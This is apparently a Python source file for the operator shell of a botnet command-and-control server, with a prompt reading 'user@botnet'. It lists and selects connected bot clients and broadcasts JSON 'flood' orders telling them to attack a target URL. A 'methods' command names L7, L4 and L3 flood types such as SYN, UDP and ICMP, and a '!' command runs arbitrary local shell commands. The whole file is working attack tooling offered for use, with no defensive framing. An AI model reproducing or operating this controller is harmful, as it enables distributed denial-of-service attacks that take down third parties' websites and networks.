from core.server import Server
from colorama import Fore,init
init(autoreset=True)
import getpass
import json

import readline
import atexit
import os

HISTORY_FILE = os.path.expanduser("~/.shell_history")

if os.path.exists(HISTORY_FILE):
    readline.read_history_file(HISTORY_FILE)
atexit.register(readline.write_history_file, HISTORY_FILE)
readline.parse_and_bind("tab: complete")

class Command:
    def __init__(self, name, func, level=1, usage=""):
        self.name = name
        self.func = func
        self.level = level
        self.usage = usage

class Payloads:
    @staticmethod
    def flood(url: str, duration: int, method: str, threads: int):
        return json.dumps({
            "action": "flood",
            "data": {
                "url": url,
                "duration": duration,
                "method": method,
                "threads": threads
            }
        })
    @staticmethod
    def ping():
        return json.dumps({"action": "ping"})

class Functions:
    def __init__(self, server: Server, shell):
        self.server = server
        self.shell = shell

    def send_payload(self, payload: str):
        if self.shell.selected_client:
            sock = self.shell.selected_client["sock"]
            print(f'Payload sent only to {self.shell.selected_client["uuid"]}')
            self.server.send_to(sock, payload)
        else:
            self.server.send_to_all(payload)

    def send_flood_payload(self, url: str, duration: int = 30, method: str = "GET", threads: int = 100):
        payload = Payloads.flood(url, duration, method, threads)
        self.send_payload(payload)

    def send_ping_payload(self):
        payload = Payloads.ping()
        self.send_payload(payload)

class Commands:
    def __init__(self, server: Server, shell):
        self.server = server
        self.functions = Functions(server, shell)

    def parse_arg(self, args, index, default=None, cast=str):
        try:
            return cast(args[index])
        except (IndexError, ValueError, TypeError):
            return default

    def help(self, shell, args):
        print("\nCommands:")
        for cmd in shell.commands.values():
            print(f"  {cmd.name:<10} - {cmd.usage} (lvl {cmd.level})")

    def shell_exec(self, shell, args):
        import subprocess
        subprocess.run(" ".join(args), shell=True)
        
    def flood(self, shell, args):
        url = self.parse_arg(args, 0, default=None, cast=str)
        duration = self.parse_arg(args, 1, default=30, cast=int)
        method = self.parse_arg(args, 2, default="GET", cast=str)
        threads = self.parse_arg(args, 3, default=100, cast=int)

        if not url:
            print(f"Usage: {shell.commands['flood'].usage}")
            return

        confirm = input(f"Confirm flood {url} for {duration}s with {threads} threads? (y/n) > ").strip().lower()
        if confirm in ["y", "yes"]:
            self.functions.send_flood_payload(url, duration, method, threads)
            print(f"OK, flood payload sent -> {url}")
        else:
            print("Cancelled")

    def ping(self, shell, args):
        print("OK, ping sent to all clients")
        self.functions.send_ping_payload()

    def quit(self, shell, args):
        self.server._shutdown()
        shell.running = False
        print("Server stopped, exiting shell...")

    def clients(self, shell, args):
        if not args:
            print("Usage: clients <list/update/select/get>")
            return

        clients = self.server.get_clients()
        subcmd = args[0]

        if subcmd == "list":
            print(f"\nClients: Total {len(clients)}")
            print(f"{'UUID':<11}{'Address':<25}{'Public Key':<34}")
            print("-" * 70)
            for sock, data in clients:
                try:
                    addr = str(sock.getpeername())
                except OSError:
                    addr = "unknown"
                pubkey = data.get("pubkey")
                _id = data.get("uuid", "unknown")
                pubkey_str = str(pubkey.public_numbers().n)[:32] + ".." if pubkey else "N/A"
                print(f"{_id:<11}{addr:<25}{pubkey_str}")

        elif subcmd == "update":
            self.functions.send_ping_payload()
            print("OK, update payload sent to all clients")

        elif subcmd == "select":
            uuid = self.parse_arg(args, 1)
            if not uuid:
                print("Usage: clients select <uuid>")
                return

            if uuid.lower() in ["none", "clear", "reset"]:
                shell.selected_client = None
                print("Client selection cleared")
                return

            for sock, info in clients:
                if info.get('uuid') == uuid:
                    shell.selected_client = {"sock": sock, "uuid": uuid}
                    print(f"Selected client {uuid}")
                    return
            print("Client not found")

        elif subcmd == "get":
            uuid = self.parse_arg(args, 1)
            field = self.parse_arg(args, 2)
            if not uuid or not field:
                print("Usage: clients get <uuid> <field>")
                return

            for sock, data in clients:
                if data.get('uuid') == uuid:
                    try:
                        addr, port = sock.getpeername()
                    except OSError:
                        addr, port = "unknown", None

                    fields_mapping = {
                        "uuid": uuid,
                        "address": sock.getpeername()[0] if sock else "unknown",
                        "port": sock.getpeername()[1] if sock else None,
                        "pubkey": str(data.get("pubkey").public_numbers().n) if data.get("pubkey") else "N/A"
                    }

                    if field in ['all', 'fields', 'list']:
                        for k, v in fields_mapping.items():
                            print(f"{k}: {v}")
                    else:
                        print(fields_mapping.get(field, "Field not found"))
                    break
            else:
                print("Client not found")
        else:
            print("Unknown subcommand for clients")

    def methods(self, shell, args):
        print(
            "Methods:\n"
            "L7 (App)       : GET, POST, PUT, DELETE, HEAD, DNS\n"
            "L4 (Transport) : ACK, SYN, FIN, RST, TCP, UDP\n"
            "L3 (Network)   : ICMP"
        )


users_permission_table = {
    "root": {"level":3, "shell_color": Fore.RED},
}

class Shell:
    def __init__(self, server: Server):
        self.server = server    
        self.selected_client = None

        readline.set_completer(self._complete)

        self.user = getpass.getuser()
        if self.user not in users_permission_table:
            users_permission_table[self.user] = {"level":1, "shell_color": Fore.GREEN}
        self.user_level = users_permission_table[self.user]["level"]
        self.running = True
        self.commands = {}
        self.commands_impl = Commands(server, self)
        self._register_default_commands()

    def _register_command(self, name: str, func, level: int = 1, usage: str = ""):
        self.commands[name] = Command(name, func, level, usage)

    def _register_default_commands(self):
        self._register_command("help", self.commands_impl.help, level=1, usage="help")
        self._register_command("quit", self.commands_impl.quit, level=1, usage="quit")
        self._register_command("flood", self.commands_impl.flood, level=3, usage="flood <url> [duration] [method] [threads]")
        self._register_command("clients", self.commands_impl.clients, level=2, usage="clients <list/update>")
        self._register_command("methods", self.commands_impl.methods, usage="methods")
        self._register_command("ping", self.commands_impl.ping, level=2, usage="ping")
        self._register_command("!", self.commands_impl.shell_exec, level=1, usage="! <command>")

    def run(self):
        print("\nType 'help' for commands\n")
        while self.running:
            try:
                if self.selected_client:
                    prompt = (
                        f"{users_permission_table[self.user]['shell_color']}"
                        f"{self.user}{Fore.BLUE}@{self.selected_client['uuid']}{Fore.RESET} > "
                    )
                else:
                    prompt = (
                        f"{users_permission_table[self.user]['shell_color']}"
                        f"{self.user}{Fore.BLUE}@botnet{Fore.RESET} > "
                    )

                raw_input = input(prompt).strip()
                if not raw_input:
                    continue
                parts = raw_input.split()
                cmd_name, *args = parts
                if cmd_name not in self.commands:
                    print(f"Unknown command: {cmd_name}")
                    continue
                self._execute_command(self.commands[cmd_name], args)
            except KeyboardInterrupt:
                print("\nInterrupted. Type 'quit' to exit")
            except Exception as e:
                print(f"Error: {e}")
            print("")

    def _complete(self, text, state):
        options = [cmd for cmd in self.commands if cmd.startswith(text)]
        if state < len(options):
            return options[state]
        return None

    def _execute_command(self, command: Command, args):
        if self.user_level < command.level:
            print("Permission denied")
            return
        command.func(self, args)
